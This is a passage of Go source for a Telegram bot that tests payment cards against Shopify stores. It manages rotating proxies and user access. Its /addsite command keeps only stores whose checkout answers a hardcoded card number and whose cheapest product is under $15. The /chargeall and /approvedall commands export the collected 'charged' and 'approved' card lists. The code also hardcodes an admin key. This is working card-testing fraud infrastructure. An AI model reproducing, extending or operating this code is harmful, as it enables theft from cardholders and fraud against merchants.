                                rawProxies = append(rawProxies, line)
                        }
                }
                if len(rawProxies) == 0 {
                        return c.Send("❌ No proxies provided")
                }

                ud := um.Get(c.Sender().ID)

                // Pre-filter: normalize + dedup before testing
                type proxyEntry struct {
                        normalized string
                        valid      bool
                }
                var toTest []proxyEntry
                dupes := 0
                parseFail := 0
                existing := make(map[string]bool)
                for _, p := range ud.Proxies {
                        existing[p] = true
                }
                for _, rp := range rawProxies {
                        normalized, err := normalizeProxy(rp)
                        if err != nil {
                                parseFail++
                                continue
                        }
                        if _, err := url.Parse(normalized); err != nil {
                                parseFail++
                                continue
                        }
                        if existing[normalized] {
                                dupes++
                                continue
                        }
                        existing[normalized] = true
                        toTest = append(toTest, proxyEntry{normalized: normalized})
                }

                if len(toTest) == 0 {
                        msg := em(emojiCross, "❌") + " No new proxies to test"
                        if parseFail > 0 {
                                msg += fmt.Sprintf(" (%d invalid)", parseFail)
                        }
                        if dupes > 0 {
                                msg += fmt.Sprintf(" (%d duplicate)", dupes)
                        }
                        return c.Send(msg, tele.ModeHTML)
                }

                c.Send(em(emojiSearch, "🔄")+fmt.Sprintf(" Testing %d proxy(s)...", len(toTest)), tele.ModeHTML)

                // Test all proxies concurrently
                var wg sync.WaitGroup
                results := make([]bool, len(toTest))
                for i := range toTest {
                        wg.Add(1)
                        go func(idx int) {
                                defer wg.Done()
                                if err := testProxy(toTest[idx].normalized); err == nil {
                                        results[idx] = true
                                }
                        }(i)
                }
                wg.Wait()

                added := 0
                failed := 0
                for i, ok := range results {
                        if ok {
                                ud.Proxies = append(ud.Proxies, toTest[i].normalized)
                                added++
                        } else {
                                failed++
                        }
                }
                failed += parseFail

                um.Save()

                msg := em(emojiCheck, "✅") + fmt.Sprintf(" %d proxy(s) added (%d total)", added, len(ud.Proxies))
                if failed > 0 {
                        msg += fmt.Sprintf("\n"+em(emojiCross, "❌")+" %d failed", failed)
                }
                if dupes > 0 {
                        msg += fmt.Sprintf("\n"+em(emojiLightning, "⏭")+" %d duplicate(s) skipped", dupes)
                }
                return c.Send(msg, tele.ModeHTML)
        })

        // /fastsites — admin only, bulk-add sites WITHOUT live verification (for trusted lists)
        bot.Handle("/fastsites", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send("❌ Only admin can use /fastsites")
                }

                var raw string
                msg := c.Message()

                var doc *tele.Document
                if msg.Document != nil {
                        doc = msg.Document
                } else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
                        doc = msg.ReplyTo.Document
                }
                if doc != nil {
                        rc, err := bot.File(&doc.File)
                        if err != nil {
                                return c.Send("❌ Failed to download file: " + err.Error())
                        }
                        defer rc.Close()
                        data, err := io.ReadAll(rc)
                        if err != nil {
                                return c.Send("❌ Failed to read file: " + err.Error())
                        }
                        raw = string(data)
                } else {
                        fullText := msg.Text
                        idx := strings.Index(fullText, "/fastsites")
                        if idx >= 0 {
                                after := fullText[idx+len("/fastsites"):]
                                if len(after) > 0 && after[0] == '@' {
                                        if sp := strings.IndexAny(after, " \n"); sp >= 0 {
                                                after = after[sp:]
                                        } else {
                                                after = ""
                                        }
                                }
                                raw = after
                        }
                }

                raw = strings.TrimSpace(raw)
                if raw == "" {
                        return c.Send("⚠️ Usage: /fastsites site1\nsite2\nsite3\n\nOr reply to a .txt file with /fastsites\n\n⚡ No live verification — sites added instantly.")
                }

                customSitesMu.Lock()
                existingSet := make(map[string]bool, len(customSites))
                for _, s := range customSites {
                        existingSet[s] = true
                }

                added := 0
                dupes := 0
                invalid := 0
                for _, line := range strings.Split(raw, "\n") {
                        site := strings.TrimRight(strings.TrimSpace(line), "/")
                        if site == "" {
                                continue
                        }
                        if !strings.Contains(site, ".") {
                                invalid++
                                continue
                        }
                        if !strings.HasPrefix(site, "http") {
                                site = "https://" + site
                        }
                        if existingSet[site] {
                                dupes++
                                continue
                        }
                        customSites = append(customSites, site)
                        existingSet[site] = true
                        added++
                }
                total := len(customSites)
                customSitesMu.Unlock()

                if added > 0 {
                        saveCustomSites()
                }

                var sb strings.Builder
                sb.WriteString("⚡ <b>Fast Import Complete</b>\n")
                sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n")
                sb.WriteString(fmt.Sprintf("✅ Added: <b>%d</b>\n", added))
                if dupes > 0 {
                        sb.WriteString(fmt.Sprintf("⏭ Duplicates skipped: <b>%d</b>\n", dupes))
                }
                if invalid > 0 {
                        sb.WriteString(fmt.Sprintf("⚠️ Invalid lines skipped: <b>%d</b>\n", invalid))
                }
                sb.WriteString(fmt.Sprintf("📊 Total custom sites: <b>%d</b>\n", total))
                sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n")
                sb.WriteString("⚠️ No live verification — use /addsite for verified import.")
                return c.Send(sb.String(), tele.ModeHTML)
        })

        // /rmpr <proxy|all> — alias for /roxy
        bot.Handle("/rmpr", func(c tele.Context) error {
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /rmpr <proxy> or /rmpr all")
                }
                return handleProxyRemove(c, raw, um)
        })

        // /roxy <proxy|all>
        bot.Handle("/roxy", func(c tele.Context) error {
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /roxy <proxy> or /roxy all")
                }
                return handleProxyRemove(c, raw, um)
        })

        // /stop — stop own session
        bot.Handle("/stop", func(c tele.Context) error {
                uid := c.Sender().ID
                val, ok := activeSessions.Load(uid)
                if !ok {
                        return c.Send(em(emojiWarn, "⚠️")+" No active session to stop.", tele.ModeHTML)
                }
                sess := val.(*CheckSession)
                sess.Cancelled.Store(true)
                if sess.Cancel != nil {
                        sess.Cancel()
                }
                c.Send(em(emojiCross, "🛑")+fmt.Sprintf(" Stopping session... (%d/%d done)", sess.Checked.Load(), sess.Total), tele.ModeHTML)
                return nil
        })

        // /stopall — admin only, stop all sessions
        bot.Handle("/stopall", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /stopall", tele.ModeHTML)
                }
                count := 0
                activeSessions.Range(func(key, val any) bool {
                        sess := val.(*CheckSession)
                        sess.Cancelled.Store(true)
                        if sess.Cancel != nil {
                                sess.Cancel()
                        }
                        count++
                        return true
                })
                if count == 0 {
                        return c.Send(em(emojiWarn, "⚠️")+" No active sessions.", tele.ModeHTML)
                }
                return c.Send(em(emojiCross, "🛑")+fmt.Sprintf(" Stopping %d session(s)...", count), tele.ModeHTML)
        })

        // /ban <userid> — admin only
        bot.Handle("/ban", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /ban", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /ban <userid>")
                }
                uid, err := strconv.ParseInt(raw, 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
                }
                if isAdmin(uid) {
                        return c.Send(em(emojiCross, "❌")+" Cannot ban admin", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.BannedUsers[uid] = true
                cfg.mu.Unlock()
                cfg.Save()
                // Also stop their session if running
                if val, ok := activeSessions.Load(uid); ok {
                        sess := val.(*CheckSession)
                        sess.Cancelled.Store(true)
                        if sess.Cancel != nil {
                                sess.Cancel()
                        }
                }
                return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d banned.", uid), tele.ModeHTML)
        })

        // /unban <userid> — admin only
        bot.Handle("/unban", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /unban", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /unban <userid>")
                }
                uid, err := strconv.ParseInt(raw, 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
                }
                cfg.mu.Lock()
                delete(cfg.BannedUsers, uid)
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d unbanned.", uid), tele.ModeHTML)
        })

        // /pvtonly — admin only, toggle private mode
        bot.Handle("/pvtonly", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /pvtonly", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.PvtOnly = !cfg.PvtOnly
                state := cfg.PvtOnly
                cfg.mu.Unlock()
                cfg.Save()
                if state {
                        return c.Send(em(emojiCross, "🔒")+" Private mode ON — only allowed users can use the bot.", tele.ModeHTML)
                }
                return c.Send(em(emojiCheck, "🔓")+" Private mode OFF — everyone can use the bot.", tele.ModeHTML)
        })

        // /allowuser <userid> — admin only
        bot.Handle("/allowuser", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /allowuser", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /allowuser <userid>")
                }
                uid, err := strconv.ParseInt(raw, 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.AllowedUsers[uid] = true
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d allowed.", uid), tele.ModeHTML)
        })

        // /removeuser <userid> — admin only, remove from allowed list
        bot.Handle("/removeuser", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /removeuser", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /removeuser <userid>")
                }
                uid, err := strconv.ParseInt(raw, 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
                }
                cfg.mu.Lock()
                delete(cfg.AllowedUsers, uid)
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d removed from allowed list.", uid), tele.ModeHTML)
        })

        // /split <N> — reply to a .txt file, splits it into N parts
        bot.Handle("/split", func(c tele.Context) error {
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: reply to a .txt file with /split <N>")
                }
                n, err := strconv.Atoi(raw)
                if err != nil || n < 2 {
                        return c.Send("❌ Provide a number >= 2")
                }

                msg := c.Message()
                var doc *tele.Document
                if msg.Document != nil {
                        doc = msg.Document
                } else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
                        doc = msg.ReplyTo.Document
                }
                if doc == nil {
                        return c.Send("❌ Reply to a .txt file with /split <N> or attach a .txt file with /split as caption")
                }

                rc, err := bot.File(&doc.File)
                if err != nil {
                        return c.Send("❌ Failed to download file: " + err.Error())
                }
                defer rc.Close()
                data, err := io.ReadAll(rc)
                if err != nil {
                        return c.Send("❌ Failed to read file: " + err.Error())
                }

                var lines []string
                for _, line := range strings.Split(string(data), "\n") {
                        line = strings.TrimSpace(line)
                        if line != "" {
                                lines = append(lines, line)
                        }
                }
                if len(lines) == 0 {
                        return c.Send("❌ File is empty")
                }
                if n > len(lines) {
                        n = len(lines)
                }

                chunkSize := len(lines) / n
                extra := len(lines) % n
                start := 0
                for i := 0; i < n; i++ {
                        end := start + chunkSize
                        if i < extra {
                                end++
                        }
                        chunk := lines[start:end]
                        start = end

                        buf := bytes.NewBufferString(strings.Join(chunk, "\n"))
                        fname := fmt.Sprintf("part_%d_of_%d.txt", i+1, n)
                        doc := &tele.Document{
                                File:     tele.FromReader(buf),
                                FileName: fname,
                                Caption:  fmt.Sprintf("📄 Part %d/%d (%d lines)", i+1, n, len(chunk)),
                        }
                        bot.Send(c.Chat(), doc)
                }
                return nil
        })

        // /addsite — admin only, add custom sites (text or reply to .txt)
        // Every site is verified live before being added:
        //   - must be a real working Shopify store (checkout flow responds correctly)
        //   - cheapest product price must be <= $15
        bot.Handle("/addsite", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send("❌ Only admin can use /addsite")
                }

                var raw string
                msg := c.Message()

                // Check for attached or replied .txt file
                var doc *tele.Document
                if msg.Document != nil {
                        doc = msg.Document
                } else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
                        doc = msg.ReplyTo.Document
                }
                if doc != nil {
                        rc, err := bot.File(&doc.File)
                        if err != nil {
                                return c.Send("❌ Failed to download file: " + err.Error())
                        }
                        defer rc.Close()
                        data, err := io.ReadAll(rc)
                        if err != nil {
                                return c.Send("❌ Failed to read file: " + err.Error())
                        }
                        raw = string(data)
                } else {
                        fullText := msg.Text
                        idx := strings.Index(fullText, "/addsite")
                        if idx >= 0 {
                                after := fullText[idx+len("/addsite"):]
                                if len(after) > 0 && after[0] == '@' {
                                        if sp := strings.IndexAny(after, " \n"); sp >= 0 {
                                                after = after[sp:]
                                        } else {
                                                after = ""
                                        }
                                }
                                raw = after
                        }
                }

                raw = strings.TrimSpace(raw)
                if raw == "" {
                        return c.Send("Usage: /addsite site1\nsite2\nsite3\n\nOr reply to a .txt file with /addsite\n\n⚠️ Each site is verified live before adding.")
                }

                // Parse unique URLs
                var sites []string
                seenURLs := make(map[string]bool)
                for _, line := range strings.Split(raw, "\n") {
                        site := strings.TrimRight(strings.TrimSpace(line), "/")
                        if site == "" {
                                continue
                        }
                        if !strings.HasPrefix(site, "http") {
                                site = "https://" + site
                        }
                        if !seenURLs[site] {
                                seenURLs[site] = true
                                sites = append(sites, site)
                        }
                }
                if len(sites) == 0 {
                        return c.Send("❌ No valid URLs found.")
                }

                // Dead test card — a real Shopify store will decline it; a fake/broken one won't
                const testCard = "4147207228677008|11|28|183"
                workingCodes := map[string]bool{
                        "CARD_DECLINED":      true,
                        "INSUFFICIENT_FUNDS": true,
                        "3DS_REQUIRED":       true,
                        "OTP_REQUIRED":       true,
                }

                type siteCheckResult struct {
                        url    string
                        ok     bool
                        price  float64
                        reason string
                }

                checkResults := make([]siteCheckResult, len(sites))
                var resultsMu sync.Mutex
                var completed atomic.Int32

                // compact counters for live progress
                var passCount, failCount atomic.Int32
                var lastFailsMu sync.Mutex
                var lastFails []string // last 5 rejection reasons
                var statusMsg *tele.Message

                updateProgress := func() {
                        done := int(completed.Load())
                        total := len(sites)
                        pct := 0
                        if total > 0 { pct = done * 100 / total }
                        barLen := 12
                        filled := barLen * done / max(total, 1)
                        bar := strings.Repeat("█", filled) + strings.Repeat("░", barLen-filled)
                        p := int(passCount.Load())
                        f := int(failCount.Load())

                        lastFailsMu.Lock()
                        failsPreview := ""
                        if len(lastFails) > 0 {
                                failsPreview = "\n\n<b>Latest fails:</b>\n" + strings.Join(lastFails, "\n")
                        }
                        lastFailsMu.Unlock()

                        msg := fmt.Sprintf(
                                "🔍 <b>Site Verification</b>\n"+
                                "%s <code>%3d%%</code>\n"+
                                "━━━━━━━━━━━━━━━━━━━━━━\n"+
                                "<b>Done</b>  %d / %d\n"+
                                "<b>Pass</b>  %d ✅\n"+
                                "<b>Fail</b>  %d ❌\n"+
                                "<b>Left</b>  %d ⏳%s",
                                bar, pct, done, total, p, f, total-done, failsPreview,
                        )
                        if statusMsg != nil {
                                bot.Edit(statusMsg, msg, tele.ModeHTML)
                        }
                }

                statusMsg, _ = bot.Send(c.Chat(),
                        fmt.Sprintf("🔍 <b>Verifying %d site(s) live...</b>\n⏳ 0/%d done", len(sites), len(sites)),
                        tele.ModeHTML)

                // Run checks concurrently, max 5 at once
                sem := make(chan struct{}, 5)
                var wg sync.WaitGroup
                for i, siteURL := range sites {
                        wg.Add(1)
                        go func(idx int, u string) {
                                defer wg.Done()
                                sem <- struct{}{}
                                defer func() { <-sem }()

                                apiResp, err := callCheckAPI(u, testCard, "")
                                if err != nil {
                                        resultsMu.Lock()
                                        checkResults[idx] = siteCheckResult{url: u, ok: false, reason: "API error: " + err.Error()}
                                        resultsMu.Unlock()
                                        failCount.Add(1)
                                        lastFailsMu.Lock()
                                        lastFails = append(lastFails, fmt.Sprintf("❌ %s — API error", strings.TrimPrefix(u, "https://")))
                                        if len(lastFails) > 5 { lastFails = lastFails[len(lastFails)-5:] }
                                        lastFailsMu.Unlock()
                                        completed.Add(1)
                                        updateProgress()
                                        return
                                }

                                code := strings.ToUpper(strings.TrimSpace(apiResp.Response))
                                price := apiResp.Price

                                if !workingCodes[code] {
                                        resultsMu.Lock()
                                        checkResults[idx] = siteCheckResult{url: u, ok: false,
                                                reason: fmt.Sprintf("Not a working Shopify store (%s)", code)}
                                        resultsMu.Unlock()
                                        failCount.Add(1)
                                        lastFailsMu.Lock()
                                        lastFails = append(lastFails, fmt.Sprintf("❌ %s — %s", strings.TrimPrefix(u, "https://"), code))
                                        if len(lastFails) > 5 { lastFails = lastFails[len(lastFails)-5:] }
                                        lastFailsMu.Unlock()
                                        completed.Add(1)
                                        updateProgress()
                                        return
                                }
                                if price <= 0 {
                                        resultsMu.Lock()
                                        checkResults[idx] = siteCheckResult{url: u, ok: false,
                                                reason: "Could not determine product price"}
                                        resultsMu.Unlock()
                                        failCount.Add(1)
                                        lastFailsMu.Lock()
                                        lastFails = append(lastFails, fmt.Sprintf("❌ %s — no price", strings.TrimPrefix(u, "https://")))
                                        if len(lastFails) > 5 { lastFails = lastFails[len(lastFails)-5:] }
                                        lastFailsMu.Unlock()
                                        completed.Add(1)
                                        updateProgress()
                                        return
                                }
                                if price > maxSiteAmount {
                                        resultsMu.Lock()
                                        checkResults[idx] = siteCheckResult{url: u, ok: false,
                                                reason: fmt.Sprintf("Cheapest product $%.2f — over $%.0f limit", price, maxSiteAmount)}
                                        resultsMu.Unlock()
                                        failCount.Add(1)
                                        lastFailsMu.Lock()
                                        lastFails = append(lastFails, fmt.Sprintf("❌ %s — $%.2f (too expensive)", strings.TrimPrefix(u, "https://"), price))
                                        if len(lastFails) > 5 { lastFails = lastFails[len(lastFails)-5:] }
                                        lastFailsMu.Unlock()
                                        completed.Add(1)
                                        updateProgress()
                                        return
                                }
                                resultsMu.Lock()
                                checkResults[idx] = siteCheckResult{url: u, ok: true, price: price}
                                resultsMu.Unlock()
                                passCount.Add(1)
                                completed.Add(1)
                                updateProgress()
                        }(i, siteURL)
                }
                wg.Wait()

                // Apply results — skip sites already in the list
                customSitesMu.Lock()
                existingSet := make(map[string]bool, len(customSites))
                for _, s := range customSites {
                        existingSet[s] = true
                }

                added := 0
                dupes := 0
                var rejectedLines []string
                for _, r := range checkResults {
                        if !r.ok {
                                rejectedLines = append(rejectedLines, fmt.Sprintf("❌ %s\n   └ %s", r.url, r.reason))
                                continue
                        }
                        if existingSet[r.url] {
                                dupes++
                                continue
                        }
                        customSites = append(customSites, r.url)
                        existingSet[r.url] = true
                        added++
                }
                total := len(customSites)
                customSitesMu.Unlock()

                if added > 0 {
                        saveCustomSites()
                }

                // Build clean summary
                var sb strings.Builder
                sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n")
                sb.WriteString("✅ <b>Site Verification Complete</b>\n")
                sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n\n")
                sb.WriteString(fmt.Sprintf("<b>Total checked</b>  %d\n", len(sites)))
                sb.WriteString(fmt.Sprintf("<b>Added</b>          %d ✅\n", added))
                sb.WriteString(fmt.Sprintf("<b>Rejected</b>       %d ❌\n", len(rejectedLines)))
                if dupes > 0 {
                        sb.WriteString(fmt.Sprintf("<b>Duplicates</b>     %d ⏭\n", dupes))
                }
                sb.WriteString(fmt.Sprintf("<b>Custom sites</b>   %d 📊\n", total))

                // Send detailed results as files
                var addedSites []string
                for _, r := range checkResults {
                        if r.ok && !existingSet[r.url] {
                                addedSites = append(addedSites, fmt.Sprintf("%s ($%.2f)", r.url, r.price))
                        }
                }
                if len(addedSites) > 0 {
                        var addedSB strings.Builder
                        addedSB.WriteString(fmt.Sprintf("✅ Added Sites (%d):\n\n", len(addedSites)))
                        for _, s := range addedSites {
                                addedSB.WriteString(s + "\n")
                        }
                        addedDoc := &tele.Document{
                                File:     tele.FromReader(strings.NewReader(addedSB.String())),
                                FileName: fmt.Sprintf("added_%d.txt", len(addedSites)),
                                Caption:  fmt.Sprintf("✅ %d site(s) added — $%.0f max", len(addedSites), maxSiteAmount),
                        }
                        bot.Send(c.Chat(), addedDoc)
                }
                if len(rejectedLines) > 0 {
                        var rejSB strings.Builder
                        rejSB.WriteString(fmt.Sprintf("❌ Rejected Sites (%d):\n\n", len(rejectedLines)))
                        for _, s := range rejectedLines {
                                rejSB.WriteString(s + "\n")
                        }
                        rejDoc := &tele.Document{
                                File:     tele.FromReader(strings.NewReader(rejSB.String())),
                                FileName: fmt.Sprintf("rejected_%d.txt", len(rejectedLines)),
                                Caption:  fmt.Sprintf("❌ %d site(s) rejected", len(rejectedLines)),
                        }
                        bot.Send(c.Chat(), rejDoc)
                }

                if statusMsg != nil {
                        bot.Edit(statusMsg, sb.String(), tele.ModeHTML)
                        return nil
                }
                return c.Send(sb.String(), tele.ModeHTML)
        })

        // /rmsite <site|all> — admin only
        bot.Handle("/rmsite", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send("❌ Only admin can use /rmsite")
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /rmsite <site> or /rmsite all")
                }
                if strings.ToLower(raw) == "all" {
                        customSitesMu.Lock()
                        customSites = nil
                        customSitesMu.Unlock()
                        saveCustomSites()
                        return c.Send("✅ All custom sites removed. Bot will use API sites.")
                }
                site := strings.TrimRight(strings.TrimSpace(raw), "/")
                if !strings.HasPrefix(site, "http") {
                        site = "https://" + site
                }
                customSitesMu.Lock()
                found := false
                newList := make([]string, 0, len(customSites))
                for _, s := range customSites {
                        if s == site {
                                found = true
                                continue
                        }
                        newList = append(newList, s)
                }
                customSites = newList
                remaining := len(customSites)
                customSitesMu.Unlock()
                if !found {
                        return c.Send("❌ Site not found in custom list")
                }
                saveCustomSites()
                if remaining == 0 {
                        return c.Send("✅ Site removed. No custom sites left — bot will use API sites.")
                }
                return c.Send(fmt.Sprintf("✅ Site removed (%d remaining)", remaining))
        })

        // /site <keyword> or /site all — admin only
        bot.Handle("/site", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send("❌ Only admin can use /site")
                }
                keyword := strings.TrimSpace(c.Message().Payload)
                if keyword == "" {
                        return c.Send("Usage: /site <keyword>  or  /site all")
                }

                // Gather all sites: custom + API pool
                allSites := make(map[string]bool)
                for _, s := range getCustomSites() {
                        allSites[s] = true
                }
                sitePoolMu.RLock()
                for _, s := range sitePool {
                        allSites[s] = true
                }
                sitePoolMu.RUnlock()

                if strings.ToLower(keyword) == "all" {
                        if len(allSites) == 0 {
                                return c.Send("📝 No sites available.")
                        }
                        var list []string
                        for s := range allSites {
                                list = append(list, s)
                        }
                        sort.Strings(list)
                        buf := bytes.NewBufferString(strings.Join(list, "\n"))
                        doc := &tele.Document{
                                File:     tele.FromReader(buf),
                                FileName: "sites.txt",
                                Caption:  fmt.Sprintf("🌐 All sites (%d)", len(list)),
                        }
                        return c.Send(doc)
                }

                kw := strings.ToLower(keyword)
                var matches []string
                for s := range allSites {
                        if strings.Contains(strings.ToLower(s), kw) {
                                matches = append(matches, s)
                        }
                }
                sort.Strings(matches)

                if len(matches) == 0 {
                        return c.Send(fmt.Sprintf("🔍 No sites found containing \"%s\"", keyword))
                }
                var sb strings.Builder
                sb.WriteString(fmt.Sprintf("🔍 Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
                for i, s := range matches {
                        sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
                }
                return c.Send(sb.String())
        })

        // /recheck — admin only, trigger immediate full site recheck on SiteManager
        bot.Handle("/recheck", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send("❌ Only admin can use /recheck")
                }

                adminKey := "changeme123"

                req, err := http.NewRequest("POST", siteManagerRecheckURL, nil)
                if err != nil {
                        return c.Send(fmt.Sprintf("❌ Failed to build request: %v", err))
                }
                req.Header.Set("X-Admin-Key", adminKey)

                client := &http.Client{Timeout: 15 * time.Second}
                resp, err := client.Do(req)
                if err != nil {
                        return c.Send(fmt.Sprintf("❌ Could not reach SiteManager: %v", err))
                }
                defer resp.Body.Close()

                body, _ := io.ReadAll(resp.Body)

                if resp.StatusCode == 401 {
                        return c.Send("❌ Wrong SITEMANAGER_ADMIN_KEY — SiteManager rejected the request.")
                }
                if resp.StatusCode != 200 {
                        return c.Send(fmt.Sprintf("❌ SiteManager returned HTTP %d: %s", resp.StatusCode, string(body)))
                }

                var result map[string]interface{}
                if err := json.Unmarshal(body, &result); err != nil {
                        return c.Send(fmt.Sprintf("✅ Recheck triggered.\nResponse: %s", string(body)))
                }

                msg, _ := result["message"].(string)
                if msg == "" {
                        msg = "Recheck started in background."
                }
                return c.Send("🔄 <b>Site Recheck Started</b>\n\n"+msg+"\n\nYou'll see updated results next time the bot fetches sites.", tele.ModeHTML)
        })

        // /stats — global stats for all users
        bot.Handle("/stats", func(c tele.Context) error {
                return c.Send(formatStatsMsg(um), tele.ModeHTML)
        })

        // /active
        bot.Handle("/active", func(c tele.Context) error {
                return c.Send(formatActiveMsg(), tele.ModeHTML)
        })

        // /chargeall — admin only, dump all charged cards as .txt
        bot.Handle("/chargeall", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                globalChargedMu.Lock()
                snapshot := make([]string, len(globalChargedCards))
                copy(snapshot, globalChargedCards)
                globalChargedMu.Unlock()
                if len(snapshot) == 0 {
                        return c.Send(em(emojiWarn, "⚠️")+" No charged cards collected yet.", tele.ModeHTML)
                }
                content := strings.Join(snapshot, "\n")
                doc := &tele.Document{
                        File:     tele.FromReader(strings.NewReader(content)),
                        FileName: fmt.Sprintf("CHARGED_%s.txt", time.Now().Format("20060102_150405")),
                        Caption:  fmt.Sprintf("💳 <b>All Charged Cards</b>\nTotal: <b>%d</b>", len(snapshot)),
                }
                return c.Send(doc, tele.ModeHTML)
        })

        // /approvedall — admin only, dump all approved cards as .txt
        bot.Handle("/approvedall", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                globalApprovedMu.Lock()
                snapshot := make([]string, len(globalApprovedCards))
                copy(snapshot, globalApprovedCards)
                globalApprovedMu.Unlock()
                if len(snapshot) == 0 {
                        return c.Send(em(emojiWarn, "⚠️")+" No approved cards collected yet.", tele.ModeHTML)
                }
                content := strings.Join(snapshot, "\n")
                doc := &tele.Document{
                        File:     tele.FromReader(strings.NewReader(content)),
                        FileName: fmt.Sprintf("APPROVED_%s.txt", time.Now().Format("20060102_150405")),
                        Caption:  fmt.Sprintf("✅ <b>All Approved Cards</b>\nTotal: <b>%d</b>", len(snapshot)),
                }
                return c.Send(doc, tele.ModeHTML)
        })

        // /admin — list admin commands
        bot.Handle("/admin", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                return c.Send(
                        "━━━━━━━━━━━━━━━━━━━━━━\n"+
                                "  "+em("5296369303661067030", "🔧")+" 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 "+em("5264727218734524899", "🔧")+"\n"+
                                "━━━━━━━━━━━━━━━━━━━━━━\n\n"+
                                em("5341715473882955310", "🔴")+"  /broadcast &lt;msg&gt;        — All users\n"+
                                em("5341715473882955310", "🔴")+"  /broadcastuser &lt;id&gt; &lt;m&gt; — Specific user\n"+
                                em("5215668805199473901", "🔴")+"  /broadcastactive &lt;msg&gt;  — Active sessions\n\n"+
                                em("5215668805199473901", "🚫")+"  /ban &lt;id&gt;          — Ban user\n"+
                                em("5215668805199473901", "✅")+"  /unban &lt;id&gt;        — Unban user\n"+
                                em("5240241223632954241", "🔒")+"  /pvtonly           — Toggle private mode\n"+
                                em("5352658337588612223", "👤")+"  /allowuser &lt;id&gt;    — Allow user\n"+
                                em("6003424016977628379", "❌")+"  /removeuser &lt;id&gt;   — Remove allowed user\n"+
                                em("5974048815789903111", "👥")+"  /users             — List allowed users\n\n"+
                                em("6060081662178365254", "🔒")+"  /restrict all|&lt;ids&gt;    — Block all or specific IDs\n"+
                                em("6001526766714227911", "🔓")+"  /unrestrict all|&lt;ids&gt;  — Lift restrictions\n"+
                                em("5296369303661067030", "🔐")+"  /allowonly &lt;ids&gt;       — Allow only specific IDs\n"+
                                em("5296369303661067030", "🔓")+"  /allowall              — Reset all access restrictions\n\n"+
                                em("6294100961119966181", "👑")+"  /admins            — List all admins\n"+
                                em("5393194986252542669", "➕")+"  /addadmin &lt;id&gt;     — Add dynamic admin\n"+
                                em("5382261056078881010", "➖")+"  /rmadmin &lt;id&gt;      — Remove dynamic admin\n"+
                                em("5956160118088273784", "🔑")+"  /giveperm &lt;id&gt; &lt;cmd&gt;   — Grant command permission\n\n"+
                                em("5224450179368767019", "🌐")+"  /addsite &lt;url&gt;      — Add site (with live verify)\n"+
                                em("5247120584420114337", "⚡")+"  /fastsites &lt;urls&gt;   — Bulk add sites instantly (no verify)\n"+
                                em("5445267414562389170", "🗑")+"  /rmsite &lt;url&gt;      — Remove custom site\n"+
                                em("5197269100878907942", "📋")+"  /site all          — List all sites\n\n"+
                                em("5231200819986047254", "📊")+"  /stats             — Global stats\n"+
                                em("5264727218734524899", "🔄")+"  /resetstats        — Reset all stats\n"+
